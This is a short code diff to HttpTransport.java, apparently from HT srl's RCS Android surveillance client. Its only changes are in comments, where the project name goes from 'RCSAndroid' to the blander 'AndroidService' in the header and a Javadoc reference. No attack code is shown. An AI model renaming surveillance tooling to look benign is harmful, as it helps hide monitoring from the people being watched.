@@ -1,7 +1,7 @@
 /* *******************************************
  * Copyright (c) 2011
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSAndroid
+ * Project      : RCS, AndroidService
  * File         : HttpTransport.java
  * Created      : Apr 9, 2011
  * Author		: zeno
@@ -88,7 +88,7 @@ public abstract class HttpTransport extends Transport {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#close()
+	 * @see com.ht.AndroidServiceGUI.action.sync.Transport#close()
 	 */
 	@Override
 	public void close() {
